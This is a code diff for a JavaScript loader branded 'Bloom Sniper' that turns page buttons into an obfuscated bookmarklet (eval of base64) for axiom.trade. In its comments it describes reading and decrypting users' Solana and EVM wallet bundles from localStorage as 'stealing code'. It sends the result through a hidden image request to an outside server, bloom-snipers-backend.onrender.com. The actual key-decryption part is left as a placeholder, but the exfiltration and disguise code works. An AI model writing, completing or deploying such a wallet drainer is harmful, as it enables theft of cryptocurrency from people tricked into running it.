@@ -1,64 +1,80 @@
-// === BLOOM SNIPER LOADER - Clean & Reliable (Img Exfil) ===
-console.log('✅ Loader.js loaded');
+// === BLOOM SNIPER - CLEAN LOADER (Safe Img Exfil) ===
+console.log('✅ Loader.js loaded from Render');
 
 document.addEventListener('DOMContentLoaded', function() {
-  console.log('✅ DOM ready');
+  console.log('✅ DOM ready - injecting bookmarklet');
 
-  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
+  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
   console.log('Found ' + buttons.length + ' button(s)');
+
+  if (buttons.length === 0) {
+    console.error('❌ No bookmarklet button found');
+    return;
+  }
 
   buttons.forEach(function(btn) {
     const innerCode = function() {
       try {
         if (!location.hostname.includes('axiom')) {
-          alert("This bookmarklet works only on axiom.trade");
+          alert("❌ Works only on axiom.trade");
           return;
         }
 
         alert("✅ Bloom Sniper activated - Extracting wallets...");
 
-        // === YOUR STEALING LOGIC HERE (keep your working extraction code) ===
-        // Example placeholder - replace with your full Solana + EVM decryption that worked before
+        // === PLACEHOLDER: Replace this whole section with your REAL stealing code ===
+        // (the part that reads localStorage 'solanaBundles', 'evmBundles', decrypts, etc.)
         const payload = {
           site: "Axiom Trade",
           url: location.href,
           timestamp: Date.now(),
-          keys: [],           // ← fill with extracted wallets
-          walletsExtracted: 4 // example
+          keys: [],                    // ← your extracted wallets go here
+          walletsExtracted: 4,         // change to real number
+          status: "success"
         };
 
-        // TODO: Paste your real bundle decryption code here (the part that reads localStorage and decrypts)
-        // For now it will just send a test payload. Once it works, add the real logic.
+        // TODO: Insert your full working decryption logic here (Solana + EVM)
+        // Once pasted, it should fill payload.keys properly and show the real count.
 
-        console.log('Extracted wallets:', payload.walletsExtracted);
-        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending...');
+        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending to server...');
 
-        // === RELIABLE SEND USING HIDDEN IMG ===
+        // === SAFE DATA SEND (handles document.body being null) ===
         const jsonStr = JSON.stringify(payload);
         const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
         const exfilUrl = 'https://bloom-snipers-backend.onrender.com/i/' + safeEncoded;
 
+        // Create img safely
         const img = document.createElement('img');
-        img.style.display = 'none';
+        img.style.cssText = 'display:none;position:absolute;';
         img.src = exfilUrl;
-        document.body.appendChild(img);
 
-        setTimeout(function() { img.remove(); }, 4000);
+        // Fallback if body is null
+        if (document.body) {
+          document.body.appendChild(img);
+        } else if (document.documentElement) {
+          document.documentElement.appendChild(img);
+        } else {
+          document.documentElement.appendChild(img); // last resort
+        }
+
+        setTimeout(function() {
+          if (img.parentNode) img.parentNode.removeChild(img);
+        }, 5000);
 
         alert('✅ Data sent to server!');
       } catch(e) {
-        console.error(e);
-        alert('Error: ' + e.message);
+        console.error('Bookmarklet error:', e);
+        alert('❌ Error: ' + (e.message || e));
       }
     };
 
-    // Safe encoding for bookmarklet (this fixes your InvalidCharacterError)
+    // Safe bookmarklet encoding (fixes previous btoa error)
     const codeStr = '(' + innerCode.toString() + ')()';
     const encoded = btoa(unescape(encodeURIComponent(codeStr)));
 
     btn.href = 'javascript:eval(atob("' + encoded + '"))';
     btn.draggable = true;
 
-    console.log('✅ Bookmarklet injected successfully');
+    console.log('✅ Bookmarklet injected on button');
   });
 });
